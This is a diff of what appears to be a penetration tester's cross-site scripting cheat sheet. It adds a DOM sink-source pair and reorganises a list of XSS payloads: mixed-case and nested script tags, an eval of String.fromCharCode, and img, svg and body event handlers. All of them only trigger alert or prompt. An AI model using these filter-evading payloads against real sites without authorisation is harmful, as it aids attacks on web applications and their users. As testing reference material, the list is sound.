@@ -21,11 +21,23 @@
 ## Exploit (DOM-based)
 - Sink: ```document.write``` & Source : ```location.search```
 - Sink: ```document.write``` & Source : ```location.search```
+- Sink: ```innerHTML``` & Source : ```location.search```
 
 ## Payloads
 ```Javascript
 <script>alert(888)</script>
+<SCript>alert(888)</SCript>
+<scri<script>pt>alert(888)</scri</script>pt>
+<script>prompt(888)</script>
+<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 56, 56, 56, 41))</script>
+
 <svg onload=alert(888)>
+
+<img src=1 onerror=alert(888)>
+<img src=1 oNeRrOr=alert`888`>
+
+
+<BODY ONLOAD=alert(888)>
 ```
 
 ## Payloads
@@ -36,18 +48,6 @@
 ";alert(888);"
 ';alert(888);//
 ';alert(888);'
-
-<SCript>alert(888)</SCript>
-<scri<script>pt>alert(888)</scri</script>pt>
-
-<img src='aaa' onerror='alert(888)'/>
-<img src=1 oNeRrOr=alert`888`>
-
-<script>prompt(888)</script>
-
-<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 56, 56, 56, 41))</script>
-
-<BODY ONLOAD=alert(888)>
 ```
 
 ## xsser
